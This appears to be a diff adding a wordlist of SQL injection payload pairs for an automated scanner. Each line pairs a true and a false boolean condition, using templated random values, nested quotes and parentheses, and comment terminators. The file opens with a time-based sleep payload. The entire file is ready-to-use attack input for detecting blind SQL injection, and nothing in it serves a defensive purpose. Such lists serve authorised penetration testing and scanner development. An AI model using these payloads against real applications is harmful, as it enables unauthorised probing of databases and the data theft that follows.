@@ -1,0 +1,277 @@
+' and sleep(5) or '{random:int1}'='{random:int2}§§§§' and sleep(0) or '{random:int1}'='{random:int1}
+ASC,1§§§§ASC,0
+ASC, (CASE WHEN (1=1) THEN 1 ELSE 0 END)§§§§ASC, (CASE WHEN (1=2) THEN 1 ELSE 0 END)
+ASC into @"{random:str1}"§§§§ASC into @"{random:str1}""
+ASC into @'{random:str1}'§§§§ASC into @'{random:str1}''
+ASC into @`{random:str1}`§§§§ASC into @`{random:str1}``
+ASC into @{random:str1}§§§§DESC into @{random:str1}
+DESC,1§§§§DESC,0
+DESC, (CASE WHEN (1=1) THEN 1 ELSE 0 END)§§§§DESC, (CASE WHEN (1=2) THEN 1 ELSE 0 END)
+{old} AND {random:int1} LIKE {random:int1};#§§§§{old} AND {random:int1} LIKE {random:int2};#
+{old} AND {random:int1} LIKE {random:int1};-- -§§§§{old} AND {random:int1} LIKE {random:int2};-- -
+{old}") AND {random:int1} LIKE {random:int1}#§§§§{old}") AND {random:int1} LIKE {random:int2}#
+{old}") AND {random:int1} LIKE {random:int1}-- -§§§§{old}") AND {random:int1} LIKE {random:int2}-- -
+{old}")) AND {random:int1} LIKE {random:int1}#§§§§{old}")) AND {random:int1} LIKE {random:int2}#
+{old}")) AND {random:int1} LIKE {random:int1}-- -§§§§{old}")) AND {random:int1} LIKE {random:int2}-- -
+{old}"))) AND {random:int1} LIKE {random:int1}#§§§§{old}"))) AND {random:int1} LIKE {random:int2}#
+{old}"))) AND {random:int1} LIKE {random:int1}-- -§§§§{old}"))) AND {random:int1} LIKE {random:int2}-- -
+{old}")))) AND {random:int1} LIKE {random:int1}#§§§§{old}")))) AND {random:int1} LIKE {random:int2}#
+{old}")))) AND {random:int1} LIKE {random:int1}-- -§§§§{old}")))) AND {random:int1} LIKE {random:int2}-- -
+{old}') AND {random:int1} LIKE {random:int1}#§§§§{old}') AND {random:int1} LIKE {random:int2}#
+{old}') AND {random:int1} LIKE {random:int1}-- -§§§§{old}') AND {random:int1} LIKE {random:int2}-- -
+{old}')) AND {random:int1} LIKE {random:int1}#§§§§{old}')) AND {random:int1} LIKE {random:int2}#
+{old}')) AND {random:int1} LIKE {random:int1}-- -§§§§{old}')) AND {random:int1} LIKE {random:int2}-- -
+{old}'))) AND {random:int1} LIKE {random:int1}#§§§§{old}'))) AND {random:int1} LIKE {random:int2}#
+{old}'))) AND {random:int1} LIKE {random:int1}-- -§§§§{old}'))) AND {random:int1} LIKE {random:int2}-- -
+{old}')))) AND {random:int1} LIKE {random:int1}#§§§§{old}')))) AND {random:int1} LIKE {random:int2}#
+{old}')))) AND {random:int1} LIKE {random:int1}-- -§§§§{old}')))) AND {random:int1} LIKE {random:int2}-- -
+{old}`) AND {random:int1} LIKE {random:int1}#§§§§{old}`) AND {random:int1} LIKE {random:int2}#
+{old}`) AND {random:int1} LIKE {random:int1}-- -§§§§{old}`) AND {random:int1} LIKE {random:int2}-- -
+{old}`)) AND {random:int1} LIKE {random:int1}#§§§§{old}`)) AND {random:int1} LIKE {random:int2}#
+{old}`)) AND {random:int1} LIKE {random:int1}-- -§§§§{old}`)) AND {random:int1} LIKE {random:int2}-- -
+{old}`))) AND {random:int1} LIKE {random:int1}#§§§§{old}`))) AND {random:int1} LIKE {random:int2}#
+{old}`))) AND {random:int1} LIKE {random:int1}-- -§§§§{old}`))) AND {random:int1} LIKE {random:int2}-- -
+{old}`)))) AND {random:int1} LIKE {random:int1}#§§§§{old}`)))) AND {random:int1} LIKE {random:int2}#
+{old}`)))) AND {random:int1} LIKE {random:int1}-- -§§§§{old}`)))) AND {random:int1} LIKE {random:int2}-- -
+{old} AND {random:int1}={random:int1};#§§§§{old} AND {random:int1}={random:int2};#
+{old} AND {random:int1}={random:int1};-- -§§§§{old} AND {random:int1}={random:int2};-- -
+{old}" AND {random:int1}="{random:int1}§§§§{old}" AND {random:int1}="{random:int2}
+{old}") AND {random:int1}={random:int1}#§§§§{old}") AND {random:int1}={random:int2}#
+{old}") AND {random:int1}={random:int1}-- -§§§§{old}") AND {random:int1}={random:int2}-- -
+{old}")) AND {random:int1}={random:int1}#§§§§{old}")) AND {random:int1}={random:int2}#
+{old}")) AND {random:int1}={random:int1}-- -§§§§{old}")) AND {random:int1}={random:int2}-- -
+{old}"))) AND {random:int1}={random:int1}#§§§§{old}"))) AND {random:int1}={random:int2}#
+{old}"))) AND {random:int1}={random:int1}-- -§§§§{old}"))) AND {random:int1}={random:int2}-- -
+{old}")))) AND {random:int1}={random:int1}#§§§§{old}")))) AND {random:int1}={random:int2}#
+{old}")))) AND {random:int1}={random:int1}-- -§§§§{old}")))) AND {random:int1}={random:int2}-- -
+{old}' AND '{random:int1}'='{random:int1}§§§§{old}' AND '{random:int1}'='{random:int2}
+{old}') AND {random:int1}={random:int1}#§§§§{old}') AND {random:int1}={random:int2}#
+{old}') AND {random:int1}={random:int1}-- -§§§§{old}') AND {random:int1}={random:int2}-- -
+{old}')) AND {random:int1}={random:int1}#§§§§{old}')) AND {random:int1}={random:int2}#
+{old}')) AND {random:int1}={random:int1}-- -§§§§{old}')) AND {random:int1}={random:int2}-- -
+{old}'))) AND {random:int1}={random:int1}#§§§§{old}'))) AND {random:int1}={random:int2}#
+{old}'))) AND {random:int1}={random:int1}-- -§§§§{old}'))) AND {random:int1}={random:int2}-- -
+{old}')))) AND {random:int1}={random:int1}#§§§§{old}')))) AND {random:int1}={random:int2}#
+{old}')))) AND {random:int1}={random:int1}-- -§§§§{old}')))) AND {random:int1}={random:int2}-- -
+{old}` AND {random:int1}=`{random:int1}§§§§{old}` AND {random:int1}=`{random:int2}
+{old}`) AND {random:int1}={random:int1}#§§§§{old}`) AND {random:int1}={random:int2}#
+{old}`) AND {random:int1}={random:int1}-- -§§§§{old}`) AND {random:int1}={random:int2}-- -
+{old}`)) AND {random:int1}={random:int1}#§§§§{old}`)) AND {random:int1}={random:int2}#
+{old}`)) AND {random:int1}={random:int1}-- -§§§§{old}`)) AND {random:int1}={random:int2}-- -
+{old}`))) AND {random:int1}={random:int1}#§§§§{old}`))) AND {random:int1}={random:int2}#
+{old}`))) AND {random:int1}={random:int1}-- -§§§§{old}`))) AND {random:int1}={random:int2}-- -
+{old}`)))) AND {random:int1}={random:int1}#§§§§{old}`)))) AND {random:int1}={random:int2}#
+{old}`)))) AND {random:int1}={random:int1}-- -§§§§{old}`)))) AND {random:int1}={random:int2}-- -
+{old}" AND "{random:str1}" LIKE "{random:str1}"#§§§§{old}" AND "{random:str1}" LIKE "{random:str2}"#
+{old}" AND "{random:str1}" LIKE "{random:str1}"-- -§§§§{old}" AND "{random:str1}" LIKE "{random:str2}"-- -
+{old}" AND "{random:str1}" LIKE "{random:str1}";#§§§§{old}" AND "{random:str1}" LIKE "{random:str2}";#
+{old}" AND "{random:str1}" LIKE "{random:str1}";-- -§§§§{old}" AND "{random:str1}" LIKE "{random:str2}";-- -
+{old}' AND '{random:str1}' LIKE '{random:str1}'#§§§§{old}' AND '{random:str1}' LIKE '{random:str2}'#
+{old}' AND '{random:str1}' LIKE '{random:str1}'-- -§§§§{old}' AND '{random:str1}' LIKE '{random:str2}'-- -
+{old}' AND '{random:str1}' LIKE '{random:str1}';#§§§§{old}' AND '{random:str1}' LIKE '{random:str2}';#
+{old}' AND '{random:str1}' LIKE '{random:str1}';-- -§§§§{old}' AND '{random:str1}' LIKE '{random:str2}';-- -
+{old}` AND `{random:str1}` LIKE `{random:str1}`#§§§§{old}` AND `{random:str1}` LIKE `{random:str2}`#
+{old}` AND `{random:str1}` LIKE `{random:str1}`-- -§§§§{old}` AND `{random:str1}` LIKE `{random:str2}`-- -
+{old}` AND `{random:str1}` LIKE `{random:str1}`;#§§§§{old}` AND `{random:str1}` LIKE `{random:str2}`;#
+{old}` AND `{random:str1}` LIKE `{random:str1}`;-- -§§§§{old}` AND `{random:str1}` LIKE `{random:str2}`;-- -
+{old}" AND "{random:str1}"="{random:str1}"#§§§§{old}" AND "{random:str1}"="{random:str2}"#
+{old}" AND "{random:str1}"="{random:str1}"-- -§§§§{old}" AND "{random:str1}"="{random:str2}"-- -
+{old}" AND "{random:str1}"="{random:str1}";#§§§§{old}" AND "{random:str1}"="{random:str2}";#
+{old}" AND "{random:str1}"="{random:str1}";-- -§§§§{old}" AND "{random:str1}"="{random:str2}";-- -
+{old}' AND '{random:str1}'='{random:str1}'#§§§§{old}' AND '{random:str1}'='{random:str2}'#
+{old}' AND '{random:str1}'='{random:str1}'-- -§§§§{old}' AND '{random:str1}'='{random:str2}'-- -
+{old}' AND '{random:str1}'='{random:str1}';#§§§§{old}' AND '{random:str1}'='{random:str2}';#
+{old}' AND '{random:str1}'='{random:str1}';-- -§§§§{old}' AND '{random:str1}'='{random:str2}';-- -
+{old}` AND `{random:str1}`=`{random:str1}`#§§§§{old}` AND `{random:str1}`=`{random:str2}`#
+{old}` AND `{random:str1}`=`{random:str1}`-- -§§§§{old}` AND `{random:str1}`=`{random:str2}`-- -
+{old}` AND `{random:str1}`=`{random:str1}`;#§§§§{old}` AND `{random:str1}`=`{random:str2}`;#
+{old}` AND `{random:str1}`=`{random:str1}`;-- -§§§§{old}` AND `{random:str1}`=`{random:str2}`;-- -
+{old}][[]§§§§{old}][[[
+{old}]+[{old}§§§§{old}]+[{random:str1}
+{old}][{random:str1}§§§§{old}][{old}
+{old};SELECT {random:int1}§§§§{old};SELCTE {random:int1}
+{random:int1} OR {random:int1} LIKE {random:int1};#§§§§{random:int1} OR {random:int1} LIKE {random:int2};#
+{random:int1} OR {random:int1} LIKE {random:int1};-- -§§§§{random:int1} OR {random:int1} LIKE {random:int2};-- -
+{random:str1}%27§§§§{random:str1}%27%27
+{random:str1}") OR {random:int1} LIKE {random:int1}#§§§§{random:str1}") OR {random:int1} LIKE {random:int2}#
+{random:str1}") OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}") OR {random:int1} LIKE {random:int2}-- -
+{random:str1}")) OR {random:int1} LIKE {random:int1}#§§§§{random:str1}")) OR {random:int1} LIKE {random:int2}#
+{random:str1}")) OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}")) OR {random:int1} LIKE {random:int2}-- -
+{random:str1}"))) OR {random:int1} LIKE {random:int1}#§§§§{random:str1}"))) OR {random:int1} LIKE {random:int2}#
+{random:str1}"))) OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}"))) OR {random:int1} LIKE {random:int2}-- -
+{random:str1}")))) OR {random:int1} LIKE {random:int1}#§§§§{random:str1}")))) OR {random:int1} LIKE {random:int2}#
+{random:str1}")))) OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}")))) OR {random:int1} LIKE {random:int2}-- -
+{random:str1}') OR {random:int1} LIKE {random:int1}#§§§§{random:str1}') OR {random:int1} LIKE {random:int2}#
+{random:str1}') OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}') OR {random:int1} LIKE {random:int2}-- -
+{random:str1}')) OR {random:int1} LIKE {random:int1}#§§§§{random:str1}')) OR {random:int1} LIKE {random:int2}#
+{random:str1}')) OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}')) OR {random:int1} LIKE {random:int2}-- -
+{random:str1}'))) OR {random:int1} LIKE {random:int1}#§§§§{random:str1}'))) OR {random:int1} LIKE {random:int2}#
+{random:str1}'))) OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}'))) OR {random:int1} LIKE {random:int2}-- -
+{random:str1}')))) OR {random:int1} LIKE {random:int1}#§§§§{random:str1}')))) OR {random:int1} LIKE {random:int2}#
+{random:str1}')))) OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}')))) OR {random:int1} LIKE {random:int2}-- -
+{random:str1}`) OR {random:int1} LIKE {random:int1}#§§§§{random:str1}`) OR {random:int1} LIKE {random:int2}#
+{random:str1}`) OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}`) OR {random:int1} LIKE {random:int2}-- -
+{random:str1}`)) OR {random:int1} LIKE {random:int1}#§§§§{random:str1}`)) OR {random:int1} LIKE {random:int2}#
+{random:str1}`)) OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}`)) OR {random:int1} LIKE {random:int2}-- -
+{random:str1}`))) OR {random:int1} LIKE {random:int1}#§§§§{random:str1}`))) OR {random:int1} LIKE {random:int2}#
+{random:str1}`))) OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}`))) OR {random:int1} LIKE {random:int2}-- -
+{random:str1}`)))) OR {random:int1} LIKE {random:int1}#§§§§{random:str1}`)))) OR {random:int1} LIKE {random:int2}#
+{random:str1}`)))) OR {random:int1} LIKE {random:int1}-- -§§§§{random:str1}`)))) OR {random:int1} LIKE {random:int2}-- -
+{random:str1}' or '{random:int1}'='{random:int1}' or '{random:int1}'='{random:int2}§§§§{random:str1}' or '{random:int1}'='{random:int2}' or '{random:int1}'='{random:int2}
+{random:str1} OR {random:int1}={random:int1};#§§§§{random:str1} OR {random:int1}={random:int2};#
+{random:str1} OR {random:int1}={random:int1};-- -§§§§{random:str1} OR {random:int1}={random:int2};-- -
+{random:str1}" OR {random:int1}="{random:int1}§§§§{random:str1}" OR {random:int1}="{random:int2}
+{random:str1}") OR {random:int1}={random:int1}#§§§§{random:str1}") OR {random:int1}={random:int2}#
+{random:str1}") OR {random:int1}={random:int1}-- -§§§§{random:str1}") OR {random:int1}={random:int2}-- -
+{random:str1}")) OR {random:int1}={random:int1}#§§§§{random:str1}")) OR {random:int1}={random:int2}#
+{random:str1}")) OR {random:int1}={random:int1}-- -§§§§{random:str1}")) OR {random:int1}={random:int2}-- -
+{random:str1}"))) OR {random:int1}={random:int1}#§§§§{random:str1}"))) OR {random:int1}={random:int2}#
+{random:str1}"))) OR {random:int1}={random:int1}-- -§§§§{random:str1}"))) OR {random:int1}={random:int2}-- -
+{random:str1}")))) OR {random:int1}={random:int1}#§§§§{random:str1}")))) OR {random:int1}={random:int2}#
+{random:str1}")))) OR {random:int1}={random:int1}-- -§§§§{random:str1}")))) OR {random:int1}={random:int2}-- -
+{random:str1}' OR '{random:int1}'='{random:int1}§§§§{random:str1}' OR '{random:int1}'='{random:int2}
+{random:str1}') OR {random:int1}={random:int1}#§§§§{random:str1}') OR {random:int1}={random:int2}#
+{random:str1}') OR {random:int1}={random:int1}-- -§§§§{random:str1}') OR {random:int1}={random:int2}-- -
+{random:str1}')) OR {random:int1}={random:int1}#§§§§{random:str1}')) OR {random:int1}={random:int2}#
+{random:str1}')) OR {random:int1}={random:int1}-- -§§§§{random:str1}')) OR {random:int1}={random:int2}-- -
+{random:str1}'))) OR {random:int1}={random:int1}#§§§§{random:str1}'))) OR {random:int1}={random:int2}#
+{random:str1}'))) OR {random:int1}={random:int1}-- -§§§§{random:str1}'))) OR {random:int1}={random:int2}-- -
+{random:str1}')))) OR {random:int1}={random:int1}#§§§§{random:str1}')))) OR {random:int1}={random:int2}#
+{random:str1}')))) OR {random:int1}={random:int1}-- -§§§§{random:str1}')))) OR {random:int1}={random:int2}-- -
+{random:str1}` OR {random:int1}=`{random:int1}§§§§{random:str1}` OR {random:int1}=`{random:int2}
+{random:str1}`) OR {random:int1}={random:int1}#§§§§{random:str1}`) OR {random:int1}={random:int2}#
+{random:str1}`) OR {random:int1}={random:int1}-- -§§§§{random:str1}`) OR {random:int1}={random:int2}-- -
+{random:str1}`)) OR {random:int1}={random:int1}#§§§§{random:str1}`)) OR {random:int1}={random:int2}#
+{random:str1}`)) OR {random:int1}={random:int1}-- -§§§§{random:str1}`)) OR {random:int1}={random:int2}-- -
+{random:str1}`))) OR {random:int1}={random:int1}#§§§§{random:str1}`))) OR {random:int1}={random:int2}#
+{random:str1}`))) OR {random:int1}={random:int1}-- -§§§§{random:str1}`))) OR {random:int1}={random:int2}-- -
+{random:str1}`)))) OR {random:int1}={random:int1}#§§§§{random:str1}`)))) OR {random:int1}={random:int2}#
+{random:str1}`)))) OR {random:int1}={random:int1}-- -§§§§{random:str1}`)))) OR {random:int1}={random:int2}-- -
+{random:str1}" OR "{random:str1}" LIKE "{random:str1}"#§§§§{random:str1}" OR "{random:str1}" LIKE "{random:str2}"#
+{random:str1}" OR "{random:str1}" LIKE "{random:str1}"-- -§§§§{random:str1}" OR "{random:str1}" LIKE "{random:str2}"-- -
+{random:str1}" OR "{random:str1}" LIKE "{random:str1}";#§§§§{random:str1}" OR "{random:str1}" LIKE "{random:str2}";#
+{random:str1}" OR "{random:str1}" LIKE "{random:str1}";-- -§§§§{random:str1}" OR "{random:str1}" LIKE "{random:str2}";-- -
+{random:str1}' OR '{random:str1}' LIKE '{random:str1}'#§§§§{random:str1}' OR '{random:str1}' LIKE '{random:str2}'#
+{random:str1}' OR '{random:str1}' LIKE '{random:str1}'-- -§§§§{random:str1}' OR '{random:str1}' LIKE '{random:str2}'-- -
+{random:str1}' OR '{random:str1}' LIKE '{random:str1}';#§§§§{random:str1}' OR '{random:str1}' LIKE '{random:str2}';#
+{random:str1}' OR '{random:str1}' LIKE '{random:str1}';-- -§§§§{random:str1}' OR '{random:str1}' LIKE '{random:str2}';-- -
+{random:str1}` OR `{random:str1}` LIKE `{random:str1}`#§§§§{random:str1}` OR `{random:str1}` LIKE `{random:str2}`#
+{random:str1}` OR `{random:str1}` LIKE `{random:str1}`-- -§§§§{random:str1}` OR `{random:str1}` LIKE `{random:str2}`-- -
+{random:str1}` OR `{random:str1}` LIKE `{random:str1}`;#§§§§{random:str1}` OR `{random:str1}` LIKE `{random:str2}`;#
+{random:str1}` OR `{random:str1}` LIKE `{random:str1}`;-- -§§§§{random:str1}` OR `{random:str1}` LIKE `{random:str2}`;-- -
+{random:str1}" OR "{random:str1}"="{random:str1}"#§§§§{random:str1}" OR "{random:str1}"="{random:str2}"#
+{random:str1}" OR "{random:str1}"="{random:str1}"-- -§§§§{random:str1}" OR "{random:str1}"="{random:str2}"-- -
+{random:str1}" OR "{random:str1}"="{random:str1}";#§§§§{random:str1}" OR "{random:str1}"="{random:str2}";#
+{random:str1}" OR "{random:str1}"="{random:str1}";-- -§§§§{random:str1}" OR "{random:str1}"="{random:str2}";-- -
+{random:str1}' OR '{random:str1}'='{random:str1}'#§§§§{random:str1}' OR '{random:str1}'='{random:str2}'#
+{random:str1}' OR '{random:str1}'='{random:str1}'-- -§§§§{random:str1}' OR '{random:str1}'='{random:str2}'-- -
+{random:str1}' OR '{random:str1}'='{random:str1}';#§§§§{random:str1}' OR '{random:str1}'='{random:str2}';#
+{random:str1}' OR '{random:str1}'='{random:str1}';-- -§§§§{random:str1}' OR '{random:str1}'='{random:str2}';-- -
+{random:str1}` OR `{random:str1}`=`{random:str1}`#§§§§{random:str1}` OR `{random:str1}`=`{random:str2}`#
+{random:str1}` OR `{random:str1}`=`{random:str1}`-- -§§§§{random:str1}` OR `{random:str1}`=`{random:str2}`-- -
+{random:str1}` OR `{random:str1}`=`{random:str1}`;#§§§§{random:str1}` OR `{random:str1}`=`{random:str2}`;#
+{random:str1}` OR `{random:str1}`=`{random:str1}`;-- -§§§§{random:str1}` OR `{random:str1}`=`{random:str2}`;-- -
+{random:str1} || {random:int1} LIKE {random:int1};#§§§§{random:str1} || {random:int1} LIKE {random:int2};#
+{random:str1} || {random:int1} LIKE {random:int1};-- -§§§§{random:str1} || {random:int1} LIKE {random:int2};-- -
+{random:str1}") || {random:int1} LIKE {random:int1}#§§§§{random:str1}") || {random:int1} LIKE {random:int2}#
+{random:str1}") || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}") || {random:int1} LIKE {random:int2}-- -
+{random:str1}")) || {random:int1} LIKE {random:int1}#§§§§{random:str1}")) || {random:int1} LIKE {random:int2}#
+{random:str1}")) || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}")) || {random:int1} LIKE {random:int2}-- -
+{random:str1}"))) || {random:int1} LIKE {random:int1}#§§§§{random:str1}"))) || {random:int1} LIKE {random:int2}#
+{random:str1}"))) || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}"))) || {random:int1} LIKE {random:int2}-- -
+{random:str1}")))) || {random:int1} LIKE {random:int1}#§§§§{random:str1}")))) || {random:int1} LIKE {random:int2}#
+{random:str1}")))) || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}")))) || {random:int1} LIKE {random:int2}-- -
+{random:str1}') || {random:int1} LIKE {random:int1}#§§§§{random:str1}') || {random:int1} LIKE {random:int2}#
+{random:str1}') || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}') || {random:int1} LIKE {random:int2}-- -
+{random:str1}')) || {random:int1} LIKE {random:int1}#§§§§{random:str1}')) || {random:int1} LIKE {random:int2}#
+{random:str1}')) || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}')) || {random:int1} LIKE {random:int2}-- -
+{random:str1}'))) || {random:int1} LIKE {random:int1}#§§§§{random:str1}'))) || {random:int1} LIKE {random:int2}#
+{random:str1}'))) || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}'))) || {random:int1} LIKE {random:int2}-- -
+{random:str1}')))) || {random:int1} LIKE {random:int1}#§§§§{random:str1}')))) || {random:int1} LIKE {random:int2}#
+{random:str1}')))) || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}')))) || {random:int1} LIKE {random:int2}-- -
+{random:str1}`) || {random:int1} LIKE {random:int1}#§§§§{random:str1}`) || {random:int1} LIKE {random:int2}#
+{random:str1}`) || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}`) || {random:int1} LIKE {random:int2}-- -
+{random:str1}`)) || {random:int1} LIKE {random:int1}#§§§§{random:str1}`)) || {random:int1} LIKE {random:int2}#
+{random:str1}`)) || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}`)) || {random:int1} LIKE {random:int2}-- -
+{random:str1}`))) || {random:int1} LIKE {random:int1}#§§§§{random:str1}`))) || {random:int1} LIKE {random:int2}#
+{random:str1}`))) || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}`))) || {random:int1} LIKE {random:int2}-- -
+{random:str1}`)))) || {random:int1} LIKE {random:int1}#§§§§{random:str1}`)))) || {random:int1} LIKE {random:int2}#
+{random:str1}`)))) || {random:int1} LIKE {random:int1}-- -§§§§{random:str1}`)))) || {random:int1} LIKE {random:int2}-- -
+{random:str1} || {random:int1}={random:int1};#§§§§{random:str1} || {random:int1}={random:int2};#
+{random:str1} || {random:int1}={random:int1};-- -§§§§{random:str1} || {random:int1}={random:int2};-- -
+{random:str1}"-- -§§§§{random:str1}-- -"
+{random:str1}";"#§§§§{random:str1}";#"
+{random:str1}";"-- -§§§§{random:str1}";-- -"
+{random:str1}";"/**/§§§§{random:str1}";/*"*/
+{random:str1}"§§§§{random:str1}""
+{random:str1}#"§§§§{random:str1}"#
+{random:str1}#'§§§§{random:str1}'#
+{random:str1}#`§§§§{random:str1}`#
+{random:str1}'-- -§§§§{random:str1}-- -'
+{random:str1}';'#§§§§{random:str1}';#'
+{random:str1}';'-- -§§§§{random:str1}';-- -'
+{random:str1}';'/**/§§§§{random:str1}';/*'*/
+{random:str1}'§§§§{random:str1}''
+{random:str1}/**/"§§§§{random:str1}/*"*/
+{random:str1}/**/'§§§§{random:str1}/*'*/
+{random:str1}/**/`§§§§{random:str1}/*`*/
+{random:str1}]))));-- -§§§§{random:str1}]))));- --
+{random:str1}])));-- -§§§§{random:str1}])));- --
+{random:str1}]));-- -§§§§{random:str1}]));- -
+{random:str1}]);-- -§§§§{random:str1}]);- --
+{random:str1}];-- -§§§§{random:str1}];- --
+{random:str1}`-- -§§§§{random:str1}-- -`
+{random:str1}`;`#§§§§{random:str1}`;#`
+{random:str1}`;`-- -§§§§{random:str1}`;-- -`
+{random:str1}`;`/**/§§§§{random:str1}`;/*`*/
+{random:str1}`§§§§{random:str1}``
+{random:str1}" || "{random:str1}" LIKE "§§§§{random:str1}" && "{random:str1}" LIKE "
+{random:str1}' || '{random:str1}' LIKE '§§§§{random:str1}' && '{random:str1}' LIKE '
+{random:str1}` || `{random:str1}` LIKE `§§§§{random:str1}` && `{random:str1}` LIKE `
+{random:str1}" || "{random:str1}" LIKE "{random:str1}"#§§§§{random:str1}" || "{random:str1}" LIKE "{random:str2}"#
+{random:str1}" || "{random:str1}" LIKE "{random:str1}"-- -§§§§{random:str1}" || "{random:str1}" LIKE "{random:str2}"-- -
+{random:str1}" || "{random:str1}" LIKE "{random:str1}";#§§§§{random:str1}" || "{random:str1}" LIKE "{random:str2}";#
+{random:str1}" || "{random:str1}" LIKE "{random:str1}";-- -§§§§{random:str1}" || "{random:str1}" LIKE "{random:str2}";-- -
+{random:str1}' || '{random:str1}' LIKE '{random:str1}'#§§§§{random:str1}' || '{random:str1}' LIKE '{random:str2}'#
+{random:str1}' || '{random:str1}' LIKE '{random:str1}'-- -§§§§{random:str1}' || '{random:str1}' LIKE '{random:str2}'-- -
+{random:str1}' || '{random:str1}' LIKE '{random:str1}';#§§§§{random:str1}' || '{random:str1}' LIKE '{random:str2}';#
+{random:str1}' || '{random:str1}' LIKE '{random:str1}';-- -§§§§{random:str1}' || '{random:str1}' LIKE '{random:str2}';-- -
+{random:str1}` || `{random:str1}` LIKE `{random:str1}`#§§§§{random:str1}` || `{random:str1}` LIKE `{random:str2}`#
+{random:str1}` || `{random:str1}` LIKE `{random:str1}`-- -§§§§{random:str1}` || `{random:str1}` LIKE `{random:str2}`-- -
+{random:str1}` || `{random:str1}` LIKE `{random:str1}`;#§§§§{random:str1}` || `{random:str1}` LIKE `{random:str2}`;#
+{random:str1}` || `{random:str1}` LIKE `{random:str1}`;-- -§§§§{random:str1}` || `{random:str1}` LIKE `{random:str2}`;-- -
+{random:str1}" || "{random:str1}"="§§§§{random:str1}" && "{random:str1}"="
+{random:str1}' || '{random:str1}'='§§§§{random:str1}' && '{random:str1}'='
+{random:str1}` || `{random:str1}`=`§§§§{random:str1}` && `{random:str1}`=`
+{random:str1}" || "{random:str1}"="{random:str1}"#§§§§{random:str1}" || "{random:str1}"="{random:str2}"#
+{random:str1}" || "{random:str1}"="{random:str1}"-- -§§§§{random:str1}" || "{random:str1}"="{random:str2}"-- -
+{random:str1}" || "{random:str1}"="{random:str1}";#§§§§{random:str1}" || "{random:str1}"="{random:str2}";#
+{random:str1}" || "{random:str1}"="{random:str1}";-- -§§§§{random:str1}" || "{random:str1}"="{random:str2}";-- -
+{random:str1}' || '{random:str1}'='{random:str1}'#§§§§{random:str1}' || '{random:str1}'='{random:str2}'#
+{random:str1}' || '{random:str1}'='{random:str1}'-- -§§§§{random:str1}' || '{random:str1}'='{random:str2}'-- -
+{random:str1}' || '{random:str1}'='{random:str1}';#§§§§{random:str1}' || '{random:str1}'='{random:str2}';#
+{random:str1}' || '{random:str1}'='{random:str1}';-- -§§§§{random:str1}' || '{random:str1}'='{random:str2}';-- -
+{random:str1}` || `{random:str1}`=`{random:str1}`#§§§§{random:str1}` || `{random:str1}`=`{random:str2}`#
+{random:str1}` || `{random:str1}`=`{random:str1}`-- -§§§§{random:str1}` || `{random:str1}`=`{random:str2}`-- -
+{random:str1}` || `{random:str1}`=`{random:str1}`;#§§§§{random:str1}` || `{random:str1}`=`{random:str2}`;#
+{random:str1}` || `{random:str1}`=`{random:str1}`;-- -§§§§{random:str1}` || `{random:str1}`=`{random:str2}`;-- -
+{random:str1}" WHERE {random:int1} LIKE {random:int1} AND {random:int1} LIKE "§§§§{random:str1}" WHERE {random:int1} LIKE {random:int2} AND {random:int1} LIKE "
+{random:str1}' WHERE {random:int1} LIKE {random:int1} AND {random:int1} LIKE '§§§§{random:str1}' WHERE {random:int1} LIKE {random:int2} AND {random:int1} LIKE '
+{random:str1}` WHERE {random:int1} LIKE {random:int1} AND {random:int1} LIKE `§§§§{random:str1}` WHERE {random:int1} LIKE {random:int2} AND {random:int1} LIKE `
+{random:str1}" WHERE {random:int1} LIKE {random:int1} OR {random:int1} LIKE "§§§§{random:str1}" WHERE {random:int1} LIKE {random:int2} OR {random:int1} LIKE "
+{random:str1}' WHERE {random:int1} LIKE {random:int1} OR {random:int1} LIKE '§§§§{random:str1}' WHERE {random:int1} LIKE {random:int2} OR {random:int1} LIKE '
+{random:str1}` WHERE {random:int1} LIKE {random:int1} OR {random:int1} LIKE `§§§§{random:str1}` WHERE {random:int1} LIKE {random:int2} OR {random:int1} LIKE `
+{random:str1}" WHERE {random:int1} LIKE {random:int1}#§§§§{random:str1}" WHERE {random:int1} LIKE {random:int2}#
+{random:str1}` WHERE {random:int1} LIKE {random:int1}-- -§§§§{random:str1}` WHERE {random:int1} LIKE {random:int2}-- -
+{random:str1}" WHERE {random:int1}={random:int1} AND "{random:int1}"="§§§§{random:str1}" WHERE {random:int1}={random:int2} AND "{random:int1}"="
+{random:str1}' WHERE {random:int1}={random:int1} AND '{random:int1}'='§§§§{random:str1}' WHERE {random:int1}={random:int2} AND '{random:int1}'='
+{random:str1}` WHERE {random:int1}={random:int1} AND `{random:int1}`=`§§§§{random:str1}` WHERE {random:int1}={random:int2} AND `{random:int1}`=`
+{random:str1}" WHERE {random:int1}={random:int1} OR "{random:int1}"="§§§§{random:str1}" WHERE {random:int1}={random:int2} OR "{random:int1}"="
+{random:str1}' WHERE {random:int1}={random:int1} OR '{random:int1}'='§§§§{random:str1}' WHERE {random:int1}={random:int2} OR '{random:int1}'='
+{random:str1}` WHERE {random:int1}={random:int1} OR `{random:int1}`=`§§§§{random:str1}` WHERE {random:int1}={random:int2} OR `{random:int1}`=`
+{random:str1}" WHERE {random:int1}={random:int1}#§§§§{random:str1}" WHERE {random:int1}={random:int2}#
+{random:str1}" WHERE {random:int1}={random:int1}-- -§§§§{random:str1}" WHERE {random:int1}={random:int2}-- -
+{random:str1}' WHERE {random:int1}={random:int1}#§§§§{random:str1}' WHERE {random:int1}={random:int2}#
